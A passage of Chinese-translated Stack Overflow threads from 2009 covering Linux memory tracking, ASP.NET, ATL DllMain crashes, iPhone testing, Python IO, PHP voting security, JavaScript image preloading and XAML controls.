2.  我编写了一个“purge”程序，它使用“mmap”分配和读取内存，直到“mmap”返回错误。这有望从目标进程中强制退出所有页面，该进程在“purge”运行时被挂起。然后，当目标进程恢复时，我使用 pidstat 计算页面的数量。这似乎有效，但它是一种非常生硬的工具。它没有提供有关被触摸的页面的任何信息。
3.  有人告诉我，valgrind 允许您编写插件，这些插件会导致在某些事件上执行某些操作，例如内存访问。到目前为止，这看起来很有希望。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-16T13:19:40.257

valgrind 工具 cachegrind 在跟踪内存使用方面做得很好。

还有一些工具可以以图形方式显示 cachegrind 的输出。

编辑以响应更新信息：
在 valgrind 出现之前，我使用了一个名为 mpatrol 的项目。
它使用 mprotect() 使页面只读并跟踪对
页面的访问。它还允许指定何时开始和停止报告，
例如在第 n 个 malloc 之后，以及其他规范。

它可以执行您正在寻找的许多或所有功能。

需要注意的是，它*比*valgrind 慢得多。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-16T13:41:16.570

这可以从 /proc/ *pid* /smaps 中的数据得出。这会为每个映射区域（包括堆栈、文本/数据和匿名映射区域）分解一个 RSS 值，因此您可以准确地看到每个加载的对象以及堆栈和堆的驻留内容。

一些可能有用的链接：

*   [http://bmaurer.blogspot.com/2006/03/memory-usage-with-smaps.html](http://bmaurer.blogspot.com/2006/03/memory-usage-with-smaps.html)
*   [http://www.pixelbeat.org/scripts/ps_mem.py](http://www.pixelbeat.org/scripts/ps_mem.py)

# asp.net - Ajax 自动完成问题

> ID：860879
> 
> 赞同：0
> 
> 时间：2009-05-13T23:15:11.990
> 
> 标签：asp.net, jquery, json

我在使用这个[JQuery facebook 风格的自动完成](http://www.emposha.com/javascript/fcbkcomplete.html)的 asp.net 实现时遇到了一些问题。

基本上我使用的 json url 是一个 aspx 页面，它通过查询字符串获取一些参数并将 json 写入响应。这似乎运行正常，但插件无法识别它。

奇怪的是，当我将 Request.QueryString 从页面中取出（仍然将查询字符串传递给它）并对自动完成功能正常工作的值进行硬编码时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T23:29:42.497

您可以在页面本身中记录传递给 .aspx 的查询字符串吗？创建一个文件来记录传递的整个 url。我敢打赌，正确传递查询字符串存在问题，也许它们没有正确编码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T00:04:02.627

是的，多亏了 Pawel 的提示，才发现了问题。

自动完成使用查询参数进行搜索，结果类似于 - UnassignedUsers.aspx?p=12&j=72?tag=a

# c++ - 以受限用户身份运行时，为什么我会在 DLLMain 中获得 GPF？

> ID：860880
> 
> 赞同：3
> 
> 时间：2009-05-13T23:15:34.377
> 
> 标签：c++, com, activex, atl

为什么此代码在以受限用户身份运行时会崩溃，但在以机器管理员身份运行时却不会？

```
extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, 
                               DWORD dwReason, 
                               LPVOID lpReserved)
{
 hInstance;
 m_hInstance=hInstance;
 return _AtlModule.DllMain(dwReason, lpReserved); 
} 
```

代码在返回时崩溃......我不知道为什么。

我正进入（状态：

```
The instruction at "0x7c90100b" referenced memory at "0x00000034". 
The memory could not be "read". 
```

此外，_AtlModule.DLLMain 看起来像这样：

```
inline BOOL WINAPI CAtlDllModuleT<T>::DllMain(DWORD dwReason, LPVOID lpReserved) throw()
{
#if !defined(_ATL_NATIVE_INITIALIZATION)
    dwReason; lpReserved;
#pragma warning(push)
#pragma warning(disable:4483)
    using namespace __identifier("<AtlImplementationDetails>");
#pragma warning(pop)
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        ATLASSERT(DllModuleInitialized == false);
    }
    return TRUE;
#else
    return _DllMain(dwReason, lpReserved);
#endif
} 
```

我们正在导入 ATL DLL，并尝试静态链接……不走运。

* * *

**更新**

使用 ProcMon，我在这里遇到缓冲区溢出：

RegQueryValue HKU\S-1-5-21-448539723-854245398-1957994488-1005\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache BUFFER OVERFLOW 长度：144

这是什么意思？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-14T00:16:45.027

杰森，

你在哪里声明 m_hInstance？它在 DllMain 上方是静态的吗？只是试图获取有关代码的更多详细信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-14T12:39:57.327

当您收到错误消息说您无法在某个 0x0000... 位置引用内存时，这通常意味着您的代码正在尝试引用某个对象的成员变量，但对象指针指向 NULL。在这种情况下，成员变量是对象的 0x34 个字节。进一步猜测，鉴于它仅在受限用户下运行时才会失败，我会说一些应该返回指向对象的指针的操作由于权限不足而失败。如果返回的指针未被测试为空，代码将继续运行，直到有人尝试读取其成员变量之一，此时您会崩溃。

我要做的是彻底调试代码并寻找可疑的 NULL。此外，您可能希望在 AppVerifier 下运行您的应用程序并[启用](http://technet.microsoft.com/en-us/library/bb457063.aspx)LuaPriv 测试。如果我的猜测是正确的，将会报告一些 API 调用失败，在您的代码中表现为返回的 NULL。AppVerifier 还应该为您提供堆栈跟踪，以便您可以轻松找到问题的根源。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T23:36:44.310

您并没有真正说出“崩溃”的含义，因此很难说。该代码没有做任何特别会导致崩溃的事情，因此对 ATL 模块的调用可能`DllMain`需要管理员权限并因此而失败。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-14T00:27:14.587

尝试运行[ProcMon 实用程序](http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx)，看看是否能发现差异。您必须打开过滤，否则可能会有太多输出无法通过。

检查您是否使用 ATL DLL（而不是静态库）的一件事：确保在两种情况下都获得相同版本的 DLL。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-15T13:37:39.050

看起来我们跟踪了 RDCOMClient，它用于在 R 内部运行 COM 对象。

每个人的回答都有帮助。谢谢你。

# iphone - 你的 iPhone 应用测试策略是什么？

> ID：860889
> 
> 赞同：13
> 
> 时间：2009-05-13T23:19:33.700
> 
> 标签：iphone, cocoa-touch, uikit

在提交到 App Store 之前，最好再次精确地测试应用程序。我倾向于在设备上安装我的应用程序并给它一个朋友一段时间。然后我接受反馈并开始相应地更改我的应用程序。

我想知道你的测试策略是什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-14T00:21:21.413

写一个测试计划。如果您没有这样做的经验，请从应用程序中每个功能和 UI 控件的列表开始。

写下一组简单的步骤，以确定每个功能是否正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-14T07:30:40.190

你在谈论两个不同的事情：

缺陷测试和可用性测试。

或者我认为你可能是。其他答案是关于缺陷测试，您的方法听起来像可用性测试 - 或两者兼而有之。

缺陷测试是关于发现代码中的错误。其他人对此做出了回应：

1.  进行单元测试，但不要依赖它们
2.  用户测试 - 首先由您进行。考虑一下您的代码以及可能会破坏它的内容。控制控件，将无数行文本粘贴到您的编辑中
3.  让其他不熟悉代码的人使用该应用程序
4.  使用 ObjectAlloc 和 clang 等工具来查找非功能性缺陷

在我看来，测试不是关于工具，而是关于态度。您寻找缺陷的努力程度以及报告自己的缺陷的诚实程度。

您还应该有一个良好的缺陷跟踪系统来处理它们。

可用性测试更加困难。人们在与软件交互时不了解自己的思维过程。

一个好的（便宜的）方法是把软件交给你的朋友，然后让他大声说出他的想法。然后你会得到类似“我看到这个屏幕但我不知道该按什么（你需要添加帮助或提示）。我不确定删除这是否有效（你需要添加反馈）。等等。

您可以购买非常复杂的工具来帮助进行用户测试，但这种方法在这方面还有很长的路要走。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T23:39:20.813

两个重点：

1.  使用单元测试。您可以为此使用[Google Toolbox for Mac](http://code.google.com/p/google-toolbox-for-mac/)，也可以自己动手制作。

2.  用户测试，嗯，这是用户测试。我的一位同事设计了一个 50 点的应用程序演练/问卷调查，并让大约 10 到 20 人完成——然后在我们对某些部分进行更改时重复某些部分。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-08-25T03:18:26.793

首先，我进行了**功能测试**，以检查每个功能的功能是否正常。然后，我执行**系统测试**以检查功能之间的交互并进行**探索性测试**。

最后，我成立了一个代表用户的**焦点小组**，以获取有关其可用性的反馈。实际上，如果在开发开始和开发结束时举行焦点小组会很棒。第一个事件旨在获得有关用户界面设计的反馈，第二个事件是获得有关实际应用程序的反馈。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-02-01T13:01:09.867

对于您计划通过其赚钱的严肃专业应用程序 - 首先您使用 Instruments 等进行内部“白盒”Alpha 测试，然后聘请专业质量保证测试公司进行“黑盒”功能 Beta 测试，然后你聘请专业的可用性测试公司通过视频监控对活豚鼠进行用户测试。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-08-25T03:25:09.463

在单元测试方面，我发现 GHUnit 和 OCMock 是两个非常好的工具。特别是 GHUnit，因为它带有自己的测试运行器，可以在设备或模拟器上运行。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-05-29T20:17:03.353

我会先安装 Crashlytics。因此，您提供给应用程序的任何人都有问题，您可以确切地看到发生了什么。然后你可以做的另一件事是安装 Hockeykit，这样你就可以将新的更新推送给 beta 用户。这些是我的建议。

[https://www.crashlytics.com/](https://www.crashlytics.com/)

[https://github.com/TheRealKerni/HockeyKit](https://github.com/TheRealKerni/HockeyKit)

# asp.net - Masterpage Asp.net 上的回发事件之前的验证

> ID：860891
> 
> 赞同：2
> 
> 时间：2009-05-13T23:20:10.267
> 
> 标签：asp.net, javascript, events, postback

我想知道是否有人知道使用 jquery 进行一些客户端验证然后手动为 asp.net 控件运行回发事件的方法？

这是一个示例母版页，即

```
<script type="text/javascript">
 $(document).ready(function() {
     $("#<%=lnkbtnSave.ClientID %>").click(function() {
        alert("hello");
        // Do some validation
        // If validation Passes then post back to lnkbtnSave_Click Server side Event
        });
});
</script>
<asp:LinkButton ID="lnkbtnSave" runat="server" onclick="lnkbtnSave_Click"  ><asp:Image   ID="Image3" runat="server" ImageUrl="~/images/save.gif" AlternateText="Save" />Save</asp:LinkButton> 
```

母版页代码背后

```
 public delegate void MasterPageMenuClickHandler(object sender, System.EventArgs e);
    public event MasterPageMenuClickHandler MenuButton;

    protected void lnkbtnSave_Click(object sender, EventArgs e)
    {
        // Assign value to public property
        _currentButton = "Save";

        // Fire event to existing delegates
        OnMenuButton(e);
    }

    protected virtual void OnMenuButton(EventArgs e)
    {
        if (MenuButton != null)
        {
            //Invokes the delegates.
            MenuButton(this, e);
        }
    } 
```

后面的内容页面代码

```
protected void Page_Load(object sender, EventArgs e)
{
        Master.MenuButton += new Form.MasterPageMenuClickHandler(Master_MenuButton);
}

void Master_MenuButton(object sender, EventArgs e)
    {
        switch (Master.CurrentButton)
        {
            case "Save":
                Save();
                break;
            case "New":
                Response.Redirect("ContentPage.aspx");
                break;
            default:
                break;
        }
    } 
```

此外，控件 lnkbtnSave 位于母版页中，因此我将如何确定我在哪个内容页面上，因为每个内容页面都有自己的控件来验证。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T23:23:40.667

如果你反过来看，它可以被简化。如果需要，您可以验证并阻止回发，而不是进行验证然后启动回发。

```
$('#<%= lnkbtnSave.ClientID %>').click(function(e) {
    if (!validate()) {
        e.preventDefault(); //will stop the page from posting back.
    }
}); 
```

如果您确实需要启动回发（并以另一种方式执行），您可以在验证后显式调用 ASP.NET 为您放置在页面上的 __doPostBack() 函数。

```
// This does the exact same thing as above, but it explicitly calls __doPostBack
// If you use the above code __doPostBack will be called automatically for you.
$('#<%= lnkbtnSave.ClientID %>').click(function(e) {
    if (validate()) {
        __doPostBack('<%= lnkbtnSave.ClientID %>','');
    }
    e.preventDefault();
}); 
```

让我知道这是否需要澄清。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T23:24:22.850

对于第一个问题，您应该能够只返回 true 以使链接按钮回发并返回 false 以停止它。

```
$(document).ready(function() {     
   $("#<%=lnkbtnSave.ClientID %>").click(function() {        
      alert("hello");        
      var isValid = false;
      // Do some validation
      return isValid;
    });
 }); 
```

对于第二个问题，您可以让每个页面添加自己的验证脚本版本，并让母版页中的函数使用它来确定有效性：

母版页：

```
$(document).ready(function() {     
   $("#<%=lnkbtnSave.ClientID %>").click(function() {                  
      return pageIsValid();
    });
 }); 
```

内容页：

```
 function pageIsValid() {
       var isValid = false;
       //validation logic
       return isValid;
    } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T23:45:21.160

您可以只使用一个`CustomValidator`控件并设置它的[`ClientValidationFunction`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.customvalidator.clientvalidationfunction.aspx)属性。

# python - python 是否自动并行化 IO 和 CPU 或内存绑定部分？

> ID：860893
> 
> 赞同：3
> 
> 时间：2009-05-13T23:21:09.483
> 
> 标签：python, linux, performance, text-files

[这是上一个](https://stackoverflow.com/questions/849058/is-it-possible-to-speed-up-python-io)问题的后续问题。

考虑一下这段代码，它比上一个[问题](https://stackoverflow.com/questions/849058/is-it-possible-to-speed-up-python-io)中的代码不那么玩具（但仍然比我的真实代码简单得多）

```
import sys
data=[]

for line in open(sys.argv[1]):
    data.append(line[-1])

print data[-1] 
```

现在，我期待更长的运行时间（我的基准文件长 65150224 行），可能更长。情况并非如此，它在与以前相同的硬件上运行约 2 分钟！

data.append() 是不是很轻量级？我不相信，所以我写了这个假代码来测试它：

```
data=[]
counter=0
string="a\n"

for counter in xrange(65150224):
    data.append(string[-1])

print data[-1] 
```

这在 1.5 到 3 分钟内运行（运行之间存在很大的可变性）

为什么我在前一个节目中得不到 3.5 到 5 分钟？显然 data.append() 与 IO 并行发生。

这是个好消息！

但它是如何工作的？它是记录在案的功能吗？对我的代码是否有任何要求以使其尽可能地工作（除了负载平衡 IO 和内存/CPU 活动）？还是只是简单的缓冲/缓存在起作用？

再次，我标记了“linux”这个问题，因为我只对 linux 特定的答案感兴趣。如果您认为值得做，请随意给出与操作系统无关的，甚至是其他操作系统的答案。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-13T23:58:13.993

> 显然 data.append() 与 IO 并行发生。

恐怕不是。*在 Python 中并行化 IO 和计算是*可能的，但它不会神奇地发生。

您可以做的一件事是`posix_fadvise(2)`向操作系统提示您计划按顺序读取文件 ( `POSIX_FADV_SEQUENTIAL`)。

在对 600 meg 文件（ISO）执行“wc -l”的一些粗略测试中，性能提高了大约 20%。每个测试都是在清除磁盘缓存后立即完成的。

有关 fadvise 的 Python 接口，请参阅[python-fadvise](http://chris-lamb.co.uk/projects/python-fadvise/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T23:37:27.210

您文件中的行有多大？如果它们不是很长（大约 1K 以下的任何东西都可能符合条件），那么您可能会因为输入缓冲而看到性能提升。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T23:52:30.353

为什么你认为 list.append() 会是一个较慢的操作？它非常快，考虑到列表用于保存对其中对象的引用的内部指针数组被分配在越来越大的块中，因此每个追加实际上都不会重新分配数组，并且大多数可以简单地增加长度计数器和设置一个指针和增量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-14T00:02:32.507

我没有看到任何证据表明“data.append() 与 IO 并行发生”。像 Benji 一样，我不认为这会像你想的那样是自动的。您展示了执行 data.append(line[-1]) 所需的时间与 lc = lc + 1 大致相同（与 IO 和行拆分相比，基本上没有时间）。data.append(line[-1]) 非常快并不奇怪。人们会期望整行都在一个快速缓存中，并且如前所述，append 会提前准备缓冲区，并且很少需要重新分配。此外， line[-1] 将始终为 '\n'，除了文件的最后一行（不知道 Python 是否对此进行了优化）。

唯一让我有点惊讶的是 xrange 是如此多变。我希望它总是更快，因为没有 IO，而且您实际上并没有使用计数器。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-14T04:11:56.533

如果您的运行时间在第二个示例中变化了该数量，我怀疑您的计时方法或外部影响（其他进程/系统负载）会将时间扭曲到无法提供任何可靠信息的地步。

# php - jQuery Ajax 投票

> ID：860895
> 
> 赞同：2
> 
> 时间：2009-05-13T23:21:51.137
> 
> 标签：php, ajax, security, jquery

我使用这个[JQuery Ajax 投票系统指南](http://ad1987.blogspot.com/2009/02/reddit-style-voting-with-php-mysql-and.html)作为粗略的参考，但我对它的安全性有点担心。现在，本指南基本上存储了某物的 ID 和它的投票统计信息。

我想提出一个类似的想法，但我还需要包含用户 ID，以便用户只能投票一次。这存储在 PHP 会话变量中，我想知道被调用的 ajax 页面是否可以访问该会话。如果不是，那么传递参数的安全方法是什么，这样它就不会被中间攻击的人劫持或伪造。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T23:24:37.730

只要您[`session_start();`](http://www.php.net/session_start)在脚本顶部执行此操作，服务器就可以通过 AJAX 调用访问会话数据。您还应该确保清理数据，因为我看到该教程正在执行查询而不通过[`mysql_real_escape_string`](http://www.php.net/mysql_real_escape_string). 您还应该 [`UNIQUE KEY(user_id, id)`](http://dev.mysql.com/doc/refman/5.1/en/create-table.html)在投票表上做，以确保没有欺骗。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T23:25:31.817

您应该能够从实际存储用户投票的处理程序中提取相同的 Session 变量。

作为一项基本的安全措施，您可以在 AJAX 调用之前通过投票加密页面上的 UserId，如果在会话中不可用，则在插入时解密 UserId。

# asp.net - 如何让用户停留在网站的特定页面上？

> ID：860904
> 
> 赞同：0
> 
> 时间：2009-05-13T23:24:38.823
> 
> 标签：asp.net

所以这就是我想要实现的目标

当用户登录并且他的密码已过期时，我将他重定向到更改密码屏幕。我希望用户在转到菜单中的其他链接之前更改他的密码

当他试图离开时，我想重定向回这个 changepassword.aspx，除非他更改了密码

那么我该怎么做呢？更重要的是在哪里？

谢谢您的帮助！

编辑：我知道我们可以使用 response.redirect，但它不能用于卸载操作

**编辑：好的，我问的不是这个权利，我需要帮助以使用户保持在页面上-我该怎么做以及页面的哪个部分[加载，卸载等]**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-13T23:28:34.417

请不要那样做。那种 PITA UI 很烦人。只需让他们的密码过期，如果他们不更改密码，他们就无法访问。

不要像对待孩子一样对待你的用户（除非他们真的是孩子，甚至可能不是）

编辑：将此作为社区答案，因为我只是在宣讲不回答；-)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T23:33:30.573

[解释：ASP.NET 2.0 中的表单身份验证](http://msdn.microsoft.com/en-us/library/aa480476.aspx)

“本模块解释了 ASP.NET 2.0 版中表单身份验证的工作原理。它解释了 IIS 和 ASP.NET 身份验证如何协同工作，并解释了 FormsAuthenticationModule 类的作用和操作。”

在 web.config 中，我有授权部分说

```
<authorization>
  <deny users="?"/>
  <allow users="*"/>
</authorization>

<location path="ChangePassword.aspx">
  <system.web>
    <authorization>
      <allow users="*"/>
    </authorization>
  </system.web>
</location> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T23:28:49.050

1.  如果他们需要更改密码，请设置会话变量
2.  在每次页面加载时检查该会话是否存在（并且它们不在密码更改屏幕上），重定向。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T23:45:37.807

我们**曾经**在我们的网站上使用母版页，并且在其中的 Page_Load 事件中，我们将用户重定向到我们的 changepassword.aspx 页面。

我们还使用（或滥用，取决于您的观点）asp.net 成员身份的 Profile 元素，并在其中简单地将 MustChangePassword 条目设置为 true。这意味着当他们登录时，您可以查看他们的个人资料中是否设置了 MustChangePassword 条目并重定向到更改密码页面。它肯定会让它们留在页面上。

**人们认为在每个页面加载中都坚持它是正确的，**但是检查用户配置文件中的一个元素的开销*很小*，而且您至少可以强制当前登录的用户更改他们的密码。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-05-13T23:28:22.063

在用户的会话中设置一个标志，指示他们需要更改密码，然后从所有其他页面检查该标志，并在必要时将它们重定向到更改密码页面。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-05-13T23:29:46.413

我会在他的会话中设置一个变量，然后在您的 Global.asax Application_BeginRequest 事件中检查会话变量并在需要时重定向。

# javascript - javascript 预加载是如何工作的？

> ID：860910
> 
> 赞同：6
> 
> 时间：2009-05-13T23:26:46.497
> 
> 标签：javascript, browser, preloader, image-preloader

我不想知道预加载图像的方法，我在网上找到了很多，但我想知道它是如何工作的。javascript如何能够预加载图像？我的意思是，我从这里尝试了一个片段，即使它有效，它似乎也没有预加载图像。

当我检查萤火虫时，我可以看到图像被加载了两次，一次是在预加载时，另一次是在显示它时！

为了改进这段代码，我想知道它是如何工作的。

这是我所做的：

```
 function preload(arrayOfImages) {
        $(arrayOfImages).each(function(){
            $('<img/>')[0].src = this;
            //(new Image()).src = this;
            alert(this +'  &&   ' + i++);

        });
    } 
```

然后我做这样的事情：

```
preloader = function() {
    preload(myImages);
}

$(document).ready(preloader); 
```

这是我显示/添加图像的方式：

```
$("li.works").click(function() {
             $("#viewer").children().empty();
             $('#viewer').children().append('<img src=\'images/ref/'+this.firstChild.id+'.jpg\' alt="'+this.firstChild.id+'" \/>')
             $("#viewer").children().fadeIn(); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-05-13T23:31:27.283

您的基本 Javascript 预加载器执行以下操作：

```
var image = new Image();
image.src = '/path/to/the/image.jpg'; 
```

它的工作方式是简单地创建一个新的 Image 对象并设置它的 src，浏览器将去抓取图像。我们不会将*这个*特定的图像添加到浏览器中，但是当需要通过我们设置的任何方法在页面中显示图像时，浏览器已经将它放在缓存中并且不会再次获取它。但是，如果不查看代码，我真的无法告诉您为什么您所拥有的一切都不能以这种方式工作。

[这个问题](https://stackoverflow.com/questions/761263/what-is-the-best-way-to-preload-multiple-images-in-javascript)中讨论的一个有趣的问题是，当您拥有一组图像并尝试使用相同的 Image 对象预加载它们时会发生什么：

```
var images = ['image1.jpg','image2.jpg'];
var image = new Image();
for(var x = 0; x < images.length; x++) {
    image.src = images[x];
} 
```

这只会预加载最后一个图像，因为在循环再次出现以更改对象的源之前，其余图像将没有时间进行预加载。[查看一个例子](http://www.rootspot.com/stackoverflow/preload.php)。单击按钮后，您应该能够立即看到第二张图像，但必须加载第一个图像，因为当您尝试查看它时它没有机会预加载。

因此，一次做很多事情的正确方法是：

```
var images = ['image1.jpg','image2.jpg'];
for(var x = 0; x < images.length; x++) {
    var image = new Image();
    image.src = images[x];
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2011-10-08T10:11:30.353

Javascript 预加载通过利用浏览器使用的缓存机制来工作。

其基本思想是，一旦资源被下载，它会在客户端机器上本地存储一段时间，这样浏览器就不必再次从网络上检索资源，下次需要显示时/由浏览器使用。

您的代码可能运行良好，而您只是误解了 Fire Bug 显示的内容。

要测试这个理论，只需使用干净的缓存访问 www.google.com。即首先清除您的下载历史记录。

第一次通过一切可能会有 200 OK 的状态。这意味着您的浏览器请求了资源并且服务器发送了它。如果您查看 Fire Bug 窗口的底部，它会显示页面有多大，例如 195Kb 以及从缓存中提取了多少。在这种情况下为 0Kb。

然后在不清除缓存的情况下重新加载相同的页面，您仍然会在 FireBug 中看到相同数量的请求。

原因很简单。页面没有改变，仍然需要它以前需要的所有相同资源。

不同的是，对于这些请求中的大多数，服务器返回 304 Not Modified 状态，因此浏览器检查它的缓存以查看它是否已经在本地存储了资源，在这种情况下，它是从上一个页面加载开始的。所以浏览器只是从本地缓存中提取资源。

如果您查看 Fire Bug 窗口的底部，您将看到页面大小仍然相同（195Kb），但其中大部分（在我的情况下为 188Kb）是从本地缓存中提取的。

所以缓存确实起作用了，我第二次点击谷歌时，我节省了 188Kb 的下载量。

我相信你会在预加载图像时发现同样的事情。请求仍在发出，但如果服务器返回 304 状态，那么您将看到图像实际上只是从本地缓存中提取的，而不是从网络中提取的。

因此，使用缓存的好处不是您终止所有未来的资源请求，即仍然对网络进行 Uri 查找，而是如果可能，浏览器将从本地缓存中提取以满足对内容的需求，而不是跑遍网络寻找它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-14T00:06:19.160

您可能对“预加载”的概念感到困惑。如果你的 HTML 中有一堆图片`<img src="...">`，它们不能用 Javascript 预加载，它们只是随页面一起加载。

使用 Javascript 预加载图像是关于加载尚未在文档源中的图像，然后再显示它们。它们在页面第一次呈现后加载。它们被预加载是为了在使它们出现时消除/最小化加载时间，例如在鼠标悬停时更改图像时。

对于大多数应用程序，使用“CSS sprites”作为一种预加载形式来代替 Javascript 通常是更好的做法。SO应该对此有很多问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T23:31:53.150

它只涉及制作一个新的 DOM 图像对象并设置`src`属性。没有什么聪明和AFAIK，它一直对我有用。

是否有可能第二个“加载”萤火虫向您显示它是从缓存中加载的吗？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-13T23:53:09.307

> 循环上的索引只查看第一张图像。将其更改为使用索引：
> 
> ```
> function preload(arrayOfImages) {
>     $(arrayOfImages).each(function(i){   // Note the argument
>         $('<img/>')[i].src = this;    // Note the i
>         //(new Image()).src = this;
>         alert(this +'  &&   ' + i++);
> 
>     });
> } 
> ```

编辑：回想起来，这是错误的，我可以看到您正在尝试创建图像元素。我不明白为什么索引在那里，不需要索引。我认为函数应该是这样的：

```
function preload(arrayOfImages) {
    $(arrayOfImages).each(function () {
        $('<img/>').attr('src', this);
    });
} 
```

为了实例化它，为什么不这样做：

```
$(function () {    // Equivalent to $(document).ready()
    preload(myImages);
}); 
```

JavaScript 图像预加载之所以有效，是因为在创建包含图像的 DOM 元素时，会下载并缓存该图像。即使在实际从 HTML 呈现图像时发出另一个请求，服务器也会发回 304（未更改），并且浏览器将简单地从其缓存中加载图像。

Paolo 建议使用以下符号来创建图像对象：

```
var image = new Image(); 
```

虽然这会起作用，但符合 DOM 的方法是：

```
var image = document.createElement('img');
image.setAttribute('src', 'path/to/image.jpg'); 
```

这是在脚本中完成的方式，除了它使用 jQuery 的 HTML 字符串文字语法来完成它。`Image()`此外，大多数现代浏览器通过简单地调用 DOM 标准方法来提供与构造函数的兼容性。例如，如果您打开 Google Chrome JavaScript 控制台并输入`Image`，您将获得以下信息：

```
function Image() {
    return document.createElementNS('http://www.w3.org/1999/xhtml', 'img');
} 
```

Chrome 仅使用原生 DOM 方法来创建图像元素。

# vb.net - 在 VB 代码隐藏中引用 XAML 自定义控件名称和属性

> ID：860912
> 
> 赞同：0
> 
> 时间：2009-05-13T23:27:48.630
> 
> 标签：vb.net, xaml

很抱歉这些基本问题，但我已经在网上搜索了几天，但找不到这些问题的答案。

我创建了一个自定义控件，并且我将在我的 xaml 页面上放置该自定义控件的大量实例。在使用 VB 代码后面的自定义控件时，我该如何执行以下操作？

1.  如何引用使用 MouseLeftButtonDown 事件单击的自定义控件的名称（在我的 VB 代码中）？例如，如果我在 xaml 中有 10 个自定义控件实例，每个实例都有不同的 x:name（例如 1-10），当单击特定实例时，我如何查看单击了哪个实例？我尝试了很多东西，包括 e.OriginalSource.Name （它返回控件中被单击的组件，而不是控件实例的名称）。

2.  我的自定义控件由许多部分组成（矩形、线条、文本等）。这些项目中的每一个都是我图层的一部分。在 VB 代码中，一旦我可以引用特定的控件，我如何隐藏或更改该控件的某些部分（例如隐藏行和更改文本）。此外，我需要修改的不仅仅是单击的控件，因此我需要能够访问所有控件的属性，而不仅仅是单击的内容。比如我点击Control实例Test1，我还需要对Test2、Test3、Test5做一些修改。

这是我使用 MS Blend 2 作为 Silverlight 项目的一部分一起完成的一些测试代码。我的控件要大得多，我需要该自定义控件的 200 - 250 个实例/副本，所以我真的需要知道哪个控件实例/副本被点击。

**我的用户控件：**

```
<UserControl
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    mc:Ignorable="d"
    x:Class="MyControl1"
    x:Name="UserControl"
    d:DesignWidth="60" d:DesignHeight="59">

    <Grid x:Name="LayoutRoot" MouseLeftButtonDown="OnMouseClick">
        <Rectangle x:Name="Rectangle1" Fill="#FFFFFFFF" Stroke="#FF000000"/>
        <TextBox Background="{x:Null}" x:Name="TextBox1" Text="Test" TextWrapping="Wrap"/>
        <Ellipse x:Name="Circle1" Fill="{x:Null}" Stroke="#FF000000"/>
        <Path Margin="1,29,0,29" x:Name="Line1" Fill="{x:Null}" Stretch="Fill" Stroke="#FF000000" Data="M74,80 L132,80"/>
        <Path Margin="0,0,1,14" x:Name="Line2" VerticalAlignment="Bottom" Height="1" Fill="#FFFFFFFF" Stretch="Fill" Stroke="#FF000000" Data="M73,95 L131,95"/>
        <Path Margin="0,0,0,4" x:Name="Line3" VerticalAlignment="Bottom" Height="1" Fill="#FFFFFFFF" Stretch="Fill" Stroke="#FF000000" Data="M73,105 L132,105"/>
    </Grid>
</UserControl> 
```

**我使用自定义控件的 xaml 应用程序：**

```
<Grid x:Name="LayoutRoot">
    <Tester:MyControl1 HorizontalAlignment="Left" Margin="56,54,0,0" VerticalAlignment="Top" Width="60" Height="60" x:Name="Test1"/>
    <Tester:MyControl1 HorizontalAlignment="Left" Margin="116,54,0,0" VerticalAlignment="Top" Width="60" Height="60" x:Name="Test2"/>
    <Tester:MyControl1 HorizontalAlignment="Left" Margin="176,54,0,0" VerticalAlignment="Top" Width="60" Height="60" x:Name="Test3"/>
    <Tester:MyControl1 HorizontalAlignment="Left" Margin="236,54,0,0" VerticalAlignment="Top" Width="60" Height="60" x:Name="Test4"/>
